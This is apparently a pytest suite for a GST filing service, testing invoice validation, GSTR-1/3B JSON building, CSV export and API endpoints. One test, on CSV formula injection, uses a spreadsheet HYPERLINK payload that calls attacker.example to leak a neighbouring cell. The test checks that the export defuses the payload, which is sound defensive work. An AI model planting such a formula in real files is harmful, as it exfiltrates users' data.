"""Pre-filing validation, the portal JSON shapes, and the export endpoints."""
from __future__ import annotations

import csv
import io
import json
from datetime import date
from decimal import Decimal

import pytest

from app.models.invoice import Invoice, InvoiceStatus, InvoiceType
from app.services import filing as filing_service
from app.services.filing import Severity
from tests.conftest import (
    BUSINESS_GSTIN,
    SUPPLIER_GSTIN_OTHER_STATE,
    SUPPLIER_GSTIN_SAME_STATE,
)

PERIOD = "2026-04"


def sale(**kwargs) -> Invoice:
    """An unsaved inter-state B2B sale: Maharashtra seller, Karnataka buyer."""
    defaults = dict(
        id=kwargs.pop("id", None),
        business_id=1,
        invoice_type=InvoiceType.SALES,
        status=InvoiceStatus.PARSED,
        counterparty_gstin=SUPPLIER_GSTIN_OTHER_STATE,
        counterparty_name="Northwind Supplies",
        invoice_number="S-001",
        invoice_date=date(2026, 4, 15),
        period=PERIOD,
        place_of_supply="29",
        hsn_code="84713010",
        tax_rate=Decimal("18"),
        taxable_value=Decimal("100000.00"),
        cgst=Decimal("0.00"),
        sgst=Decimal("0.00"),
        igst=Decimal("18000.00"),
        cess=Decimal("0.00"),
        total_value=Decimal("118000.00"),
        reverse_charge=False,
    )
    defaults.update(kwargs)
    return Invoice(**defaults)


def local_sale(**kwargs) -> Invoice:
    """An intra-state sale: Maharashtra to Maharashtra, so CGST + SGST."""
    defaults = dict(
        counterparty_gstin=SUPPLIER_GSTIN_SAME_STATE,
        place_of_supply="27",
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
        igst=Decimal("0.00"),
    )
    defaults.update(kwargs)
    return sale(**defaults)


def save(db, business_id, invoice) -> Invoice:
    invoice.business_id = business_id
    db.add(invoice)
    db.commit()
    db.refresh(invoice)
    return invoice


def issues_for(invoice, *, state="27") -> dict[str, Severity]:
    found = filing_service.validate_invoice(
        invoice, business_state=state, period=PERIOD
    )
    return {issue.field: issue.severity for issue in found}


# ---------------------------------------------------------------------------
# Portal conventions
# ---------------------------------------------------------------------------

def test_period_becomes_the_portal_form():
    """The portal wants MMYYYY, not the YYYY-MM this codebase stores."""
    assert filing_service.to_portal_period("2026-04") == "042026"
    assert filing_service.to_portal_period("2026-12") == "122026"


def test_dates_become_the_portal_form():
    assert filing_service.to_portal_date(date(2026, 4, 5)) == "05-04-2026"
    assert filing_service.to_portal_date(None) is None


# ---------------------------------------------------------------------------
# Validation
# ---------------------------------------------------------------------------

def test_a_clean_invoice_raises_nothing():
    assert issues_for(sale()) == {}


def test_missing_invoice_number_is_an_error():
    assert issues_for(sale(invoice_number=None))["invoice_number"] is Severity.ERROR


def test_an_over_long_invoice_number_is_an_error():
    """The portal caps invoice numbers at 16 characters."""
    assert issues_for(sale(invoice_number="X" * 17))["invoice_number"] is Severity.ERROR


def test_missing_date_is_an_error():
    assert issues_for(sale(invoice_date=None))["invoice_date"] is Severity.ERROR


def test_an_invoice_from_another_period_is_a_warning_not_an_error():
    """Late-filed invoices are routine; they are worth saying, not blocking."""
    assert issues_for(sale(period="2026-03"))["invoice_date"] is Severity.WARNING


def test_an_invalid_counterparty_gstin_is_an_error():
    """A GSTIN that does not checksum is a credit the customer cannot claim."""
    assert (
        issues_for(sale(counterparty_gstin="29AAGCB7383J1Z9"))["counterparty_gstin"]
        is Severity.ERROR
    )


def test_a_sale_without_a_gstin_is_only_a_b2c_warning():
    assert (
        issues_for(sale(counterparty_gstin=None, place_of_supply="29"))[
            "counterparty_gstin"
        ]
        is Severity.WARNING
    )


def test_a_purchase_without_a_supplier_gstin_is_an_error():
    """It can never be matched in GSTR-2B, so the credit is unclaimable."""
    invoice = sale(invoice_type=InvoiceType.PURCHASE, counterparty_gstin=None)
    assert issues_for(invoice)["counterparty_gstin"] is Severity.ERROR


def test_a_missing_hsn_is_a_warning_and_a_malformed_one_an_error():
    assert issues_for(sale(hsn_code=None))["hsn_code"] is Severity.WARNING
    assert issues_for(sale(hsn_code="123"))["hsn_code"] is Severity.ERROR
    assert issues_for(sale(hsn_code="84AB3010"))["hsn_code"] is Severity.ERROR
    assert "hsn_code" not in issues_for(sale(hsn_code="8471"))


def test_a_rate_that_is_not_a_gst_slab_is_an_error():
    """There is no 15% slab; a rate outside the set is data entry every time."""
    assert issues_for(sale(tax_rate=Decimal("15")))["tax_rate"] is Severity.ERROR


def test_tax_that_does_not_match_the_rate_is_an_error():
    assert (
        issues_for(sale(igst=Decimal("12000.00"), total_value=Decimal("112000.00")))[
            "tax_rate"
        ]
        is Severity.ERROR
    )


def test_a_rupee_of_rounding_is_not_a_validation_error():
    """Both sides round independently at line and at invoice."""
    assert "tax_rate" not in issues_for(
        sale(igst=Decimal("18000.60"), total_value=Decimal("118000.60"))
    )


def test_a_total_that_does_not_add_up_is_an_error():
    assert issues_for(sale(total_value=Decimal("999999.00")))["total_value"] is (
        Severity.ERROR
    )


def test_an_interstate_supply_carrying_local_tax_is_an_error():
    """Tax paid to the wrong government, recoverable only by amending."""
    invoice = sale(
        place_of_supply="29",
        igst=Decimal("0.00"),
        cgst=Decimal("9000.00"),
        sgst=Decimal("9000.00"),
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_an_intrastate_supply_carrying_igst_is_an_error():
    invoice = local_sale(
        igst=Decimal("18000.00"), cgst=Decimal("0.00"), sgst=Decimal("0.00")
    )
    assert issues_for(invoice)["igst"] is Severity.ERROR


def test_unequal_cgst_and_sgst_is_an_error():
    invoice = local_sale(cgst=Decimal("10000.00"), sgst=Decimal("8000.00"))
    assert issues_for(invoice)["cgst"] is Severity.ERROR


def test_a_clean_intrastate_sale_raises_nothing():
    assert issues_for(local_sale()) == {}


def test_a_sale_with_no_derivable_place_of_supply_is_an_error():
    invoice = sale(counterparty_gstin=None, place_of_supply=None)
    assert issues_for(invoice)["place_of_supply"] is Severity.ERROR


def test_an_invoice_with_no_value_at_all_is_an_error():
    invoice = sale(
        taxable_value=Decimal("0.00"),
        igst=Decimal("0.00"),
        total_value=Decimal("0.00"),
        tax_rate=None,
    )
    assert issues_for(invoice)["taxable_value"] is Severity.ERROR


def test_validate_period_reports_ok_only_when_nothing_blocks(db_session, business):
    save(db_session, business.id, sale())
    clean = filing_service.validate_period(db_session, business, PERIOD)
    assert clean.ok is True
    assert clean.invoice_count == 1

    save(db_session, business.id, sale(invoice_number=None))
    broken = filing_service.validate_period(db_session, business, PERIOD)
    assert broken.ok is False
    assert len(broken.errors) == 1


def test_warnings_alone_do_not_block_a_filing(db_session, business):
    save(db_session, business.id, sale(hsn_code=None))
    report = filing_service.validate_period(db_session, business, PERIOD)

    assert report.ok is True
    assert len(report.warnings) == 1


# ---------------------------------------------------------------------------
# GSTR-1
# ---------------------------------------------------------------------------

def test_gstr1_envelope_carries_the_gstin_and_period(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert document["gstin"] == BUSINESS_GSTIN
    assert document["fp"] == "042026"
    assert document["version"] == filing_service.GSTR1_VERSION


def test_gstr1_groups_b2b_invoices_by_counterparty(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-3"),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    by_ctin = {block["ctin"]: block for block in document["b2b"]}
    assert set(by_ctin) == {SUPPLIER_GSTIN_OTHER_STATE, SUPPLIER_GSTIN_SAME_STATE}
    assert len(by_ctin[SUPPLIER_GSTIN_OTHER_STATE]["inv"]) == 2
    assert len(by_ctin[SUPPLIER_GSTIN_SAME_STATE]["inv"]) == 1


def test_gstr1_b2b_invoice_carries_the_portal_field_names(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    invoice = document["b2b"][0]["inv"][0]
    assert invoice["inum"] == "S-001"
    assert invoice["idt"] == "15-04-2026"
    assert invoice["val"] == 118000.00
    assert invoice["pos"] == "29"
    assert invoice["rchrg"] == "N"

    item = invoice["itms"][0]["itm_det"]
    assert item["rt"] == 18.0
    assert item["txval"] == 100000.00
    assert item["iamt"] == 18000.00
    assert item["camt"] == 0.0


def test_gstr1_puts_small_unregistered_sales_in_b2cs(db_session, business):
    save(
        db_session,
        business.id,
        sale(counterparty_gstin=None, counterparty_name="Walk-in", place_of_supply="29"),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2b" not in document
    (bucket,) = document["b2cs"]
    assert bucket["sply_ty"] == "INTER"
    assert bucket["pos"] == "29"
    assert bucket["rt"] == 18.0
    assert bucket["txval"] == 100000.00


def test_gstr1_summarises_b2cs_by_place_and_rate(db_session, business):
    for number in ("C-1", "C-2"):
        save(
            db_session,
            business.id,
            sale(
                invoice_number=number,
                counterparty_gstin=None,
                place_of_supply="29",
            ),
        )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (bucket,) = document["b2cs"]
    assert bucket["txval"] == 200000.00
    assert bucket["iamt"] == 36000.00


def test_gstr1_carries_the_state_split_into_a_b2cs_bucket(db_session, business):
    """A counter sale in the seller's own state is CGST + SGST, not IGST.

    Every other B2CS assertion here is on an inter-state sale, so only `iamt`
    was ever checked — and for a retailer the intra-state row is the common
    one. Filing it with the tax in the wrong head is a return that has to be
    amended.
    """
    for number in ("C-1", "C-2"):
        save(
            db_session,
            business.id,
            local_sale(invoice_number=number, counterparty_gstin=None),
        )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (bucket,) = document["b2cs"]
    assert bucket["sply_ty"] == "INTRA"
    assert bucket["pos"] == "27"
    assert bucket["txval"] == 200000.00
    assert bucket["camt"] == 18000.00
    assert bucket["samt"] == 18000.00
    assert bucket["iamt"] == 0.0
    assert bucket["csamt"] == 0.0


def test_gstr1_carries_the_state_split_and_cess_into_the_hsn_summary(db_session, business):
    """The HSN table is filed alongside the invoices and must agree with them."""
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-1", cess=Decimal("2500.00")),
    )
    save(
        db_session,
        business.id,
        local_sale(invoice_number="S-2", cess=Decimal("2500.00")),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (entry,) = document["hsn"]["data"]
    assert entry["hsn_sc"] == "84713010"
    assert entry["txval"] == 200000.00
    assert entry["camt"] == 18000.00
    assert entry["samt"] == 18000.00
    assert entry["iamt"] == 0.0
    assert entry["csamt"] == 5000.00


def test_gstr1_declares_the_hsn_quantity_it_does_not_yet_extract(db_session, business):
    """`qty` is 0 and the unit is the portal's catch-all, deliberately.

    Filing a made-up quantity against a real HSN code is worse than filing
    none, so this asserts the placeholder rather than leaving it unpinned.
    """
    save(db_session, business.id, sale())

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    (entry,) = document["hsn"]["data"]
    assert entry["qty"] == 0
    assert entry["uqc"] == "NOS"


def test_gstr1_lists_large_interstate_unregistered_sales_separately(db_session, business):
    """Above ₹2.5 lakh a B2C inter-state supply is reported invoice by invoice."""
    save(
        db_session,
        business.id,
        sale(
            counterparty_gstin=None,
            place_of_supply="29",
            taxable_value=Decimal("300000.00"),
            igst=Decimal("54000.00"),
            total_value=Decimal("354000.00"),
        ),
    )

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2cs" not in document
    (block,) = document["b2cl"]
    assert block["pos"] == "29"
    assert block["inv"][0]["val"] == 354000.00


def test_gstr1_summarises_hsn_by_code_and_rate(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))
    save(db_session, business.id, sale(invoice_number="S-3", hsn_code="61091000"))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    data = {entry["hsn_sc"]: entry for entry in document["hsn"]["data"]}
    assert data["84713010"]["txval"] == 200000.00
    assert data["84713010"]["iamt"] == 36000.00
    assert data["61091000"]["txval"] == 100000.00
    assert [entry["num"] for entry in document["hsn"]["data"]] == [1, 2]


def test_gstr1_derives_a_missing_rate_from_the_figures(db_session, business):
    """A parsed invoice often has the amounts but no explicit rate."""
    save(db_session, business.id, sale(tax_rate=None))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert document["b2b"][0]["inv"][0]["itms"][0]["itm_det"]["rt"] == 18.0


def test_gstr1_omits_empty_blocks(db_session, business):
    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert set(document) == {"gstin", "fp", "version", "hash"}


def test_gstr1_ignores_purchases_and_failed_extractions(db_session, business):
    save(db_session, business.id, sale(invoice_type=InvoiceType.PURCHASE))
    save(db_session, business.id, sale(invoice_number="S-9", status=InvoiceStatus.FAILED))

    document = filing_service.build_gstr1(db_session, business, PERIOD)

    assert "b2b" not in document


# ---------------------------------------------------------------------------
# GSTR-3B
# ---------------------------------------------------------------------------

def test_gstr3b_reports_outward_supplies_and_tax(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert document["gstin"] == BUSINESS_GSTIN
    assert document["ret_period"] == "042026"
    outward = document["sup_details"]["osup_det"]
    assert outward["txval"] == 100000.00
    assert outward["iamt"] == 18000.00


def test_gstr3b_separates_nil_and_exempt_supplies(db_session, business):
    save(db_session, business.id, sale())
    save(
        db_session,
        business.id,
        sale(
            invoice_number="E-1",
            tax_rate=Decimal("0"),
            igst=Decimal("0.00"),
            taxable_value=Decimal("40000.00"),
            total_value=Decimal("40000.00"),
        ),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert document["sup_details"]["osup_det"]["txval"] == 100000.00
    assert document["sup_details"]["osup_nil_exmp"]["txval"] == 40000.00


def test_gstr3b_lists_interstate_supplies_to_unregistered_persons(db_session, business):
    save(
        db_session,
        business.id,
        sale(counterparty_gstin=None, place_of_supply="29"),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    (row,) = document["inter_sup"]["unreg_details"]
    assert row["pos"] == "29"
    assert row["txval"] == 100000.00
    assert row["iamt"] == 18000.00


def test_gstr3b_table_4_carries_available_reversed_and_net_itc(db_session, business):
    save(
        db_session,
        business.id,
        sale(
            invoice_type=InvoiceType.PURCHASE,
            invoice_number="P-1",
            igst=Decimal("18000.00"),
        ),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    itc = document["itc_elg"]
    assert itc["itc_avl"][0]["iamt"] == 18000.00
    assert itc["itc_rev"][0]["iamt"] == 0.0
    assert itc["itc_net"]["iamt"] == 18000.00


def test_gstr3b_carries_the_set_off_for_the_screen(db_session, business):
    save(db_session, business.id, sale())
    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    assert "gstbot_set_off" in document
    assert document["gstbot_set_off"]["cash_payable"]["igst"] == "18000.00"


def test_gstr3b_leaves_a_failed_sale_out_of_both_value_and_tax(db_session, business):
    """3.1(a) has to describe one set of invoices, not two.

    The taxable value comes from the filable rows and the tax from the ITC
    summary. When a re-parse fails, the figures from the earlier successful
    read stay on the row — so if the two sides disagree about whether that row
    counts, the return declares ₹1,00,000 of supplies carrying ₹36,000 of tax,
    and the portal rejects it for the arithmetic.
    """
    save(db_session, business.id, sale(invoice_number="S-GOOD"))
    save(
        db_session,
        business.id,
        sale(invoice_number="S-STALE", status=InvoiceStatus.FAILED),
    )

    document = filing_service.build_gstr3b(db_session, business, PERIOD)

    outward = document["sup_details"]["osup_det"]
    assert outward["txval"] == 100000.00
    assert outward["iamt"] == 18000.00
    # 18% of the declared value, which is the check the portal itself runs.
    assert outward["iamt"] == round(outward["txval"] * 0.18, 2)


# ---------------------------------------------------------------------------
# CSV
# ---------------------------------------------------------------------------

def test_csv_has_a_header_and_one_row_per_invoice(db_session, business):
    save(db_session, business.id, sale(invoice_number="S-1"))
    save(db_session, business.id, sale(invoice_number="S-2"))

    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    lines = body.strip().split("\r\n")

    assert lines[0].startswith("invoice_number,invoice_date,")
    assert len(lines) == 3
    assert "S-1" in lines[1]


def test_csv_uses_crlf_for_excel(db_session, business):
    save(db_session, business.id, sale())
    assert "\r\n" in filing_service.to_csv(
        db_session, business, PERIOD, InvoiceType.SALES
    )


def test_csv_of_an_empty_period_is_just_the_header(db_session, business):
    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    assert body.strip().count("\r\n") == 0


def test_csv_does_not_hand_a_supplier_a_formula_in_the_ca_s_spreadsheet(
    db_session, business
):
    """A trade name is free text, and this file is opened in Excel by design.

    The name arrives from an uploaded invoice, so it is chosen by whoever sent
    the invoice rather than by the business exporting the register. Excel runs
    any cell starting with "=", so without the guard a supplier can make the
    accountant's spreadsheet fetch a URL carrying the row beside it.
    """
    save(
        db_session,
        business.id,
        sale(
            invoice_number="=1+1",
            counterparty_name='=HYPERLINK("http://attacker.example/?"&A2,"Open")',
        ),
    )

    body = filing_service.to_csv(db_session, business, PERIOD, InvoiceType.SALES)
    row = next(iter(csv.DictReader(io.StringIO(body))))

    assert row["invoice_number"] == "'=1+1"
    assert row["counterparty_name"].startswith("'=")
    # Defused, not deleted: the register still records what the invoice said.
    assert "attacker.example" in row["counterparty_name"]


def test_csv_leaves_a_negative_amount_as_a_number(db_session, business):
    """A credit note's minus sign is arithmetic, not an injection.

    The numeric columns are formatted by this application rather than typed by
    anyone, so putting them through the formula guard would turn every credit
    note into text that no spreadsheet will total.
    """
    save(db_session, business.id, sale(taxable_value=Decimal("-1000.00")))

    row = next(
        iter(
            csv.DictReader(
                io.StringIO(
                    filing_service.to_csv(
                        db_session, business, PERIOD, InvoiceType.SALES
                    )
                )
            )
        )
    )

    assert row["taxable_value"] == "-1000.00"


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------

def test_validate_endpoint_reports_issues(auth_client, db_session, business):
    save(db_session, business.id, sale(invoice_number=None))

    response = auth_client.get(f"/api/v1/filing/validate?period={PERIOD}")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["ok"] is False
    assert body["error_count"] == 1
    assert body["issues"][0]["field"] == "invoice_number"


def test_gstr1_endpoint_returns_document_and_validation(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/gstr1?period={PERIOD}")

    assert response.status_code == 200, response.text
    body = response.json()
    assert body["return_type"] == "gstr1"
    assert body["document"]["fp"] == "042026"
    assert body["validation"]["ok"] is True


def test_gstr3b_endpoint_returns_the_prefill(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/gstr3b?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.json()["document"]["ret_period"] == "042026"


def test_export_json_is_a_named_download(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/export/gstr1.json?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("application/json")
    assert (
        response.headers["content-disposition"]
        == f'attachment; filename="gstr1_{BUSINESS_GSTIN}_042026.json"'
    )
    assert json.loads(response.text)["gstin"] == BUSINESS_GSTIN


def test_export_csv_carries_a_bom_for_excel(auth_client, db_session, business):
    save(db_session, business.id, sale())

    response = auth_client.get(f"/api/v1/filing/export/gstr1.csv?period={PERIOD}")

    assert response.status_code == 200, response.text
    assert response.headers["content-type"].startswith("text/csv")
    assert response.text.startswith("﻿")


def test_export_can_produce_the_purchase_register(auth_client, db_session, business):
    save(
        db_session,
        business.id,
        sale(invoice_type=InvoiceType.PURCHASE, invoice_number="P-1"),
    )

    response = auth_client.get(f"/api/v1/filing/export/purchases.csv?period={PERIOD}")

    assert response.status_code == 200
    assert "P-1" in response.text


def test_purchases_cannot_be_exported_as_json(auth_client):
    """There is no portal return built from the purchase register."""
    response = auth_client.get("/api/v1/filing/export/purchases.json")
    assert response.status_code == 400


@pytest.mark.parametrize(
    ("path", "expected"),
    [("/api/v1/filing/export/gstr9.json", 404), ("/api/v1/filing/export/gstr1.pdf", 404)],
)
def test_export_rejects_unknown_types_and_formats(auth_client, path, expected):
    assert auth_client.get(path).status_code == expected


def test_filing_endpoints_require_authentication(client):
    for path in ("/api/v1/filing/validate", "/api/v1/filing/gstr1"):
        assert client.get(path).status_code == 401


def test_filing_does_not_leak_across_tenants(auth_client, db_session, business, other_tenant):
    save(db_session, business.id, sale())

    response = auth_client.get(
        f"/api/v1/filing/gstr1?period={PERIOD}",
        headers={"Authorization": f"Bearer {other_tenant}"},
    )

    assert "b2b" not in response.json()["document"]
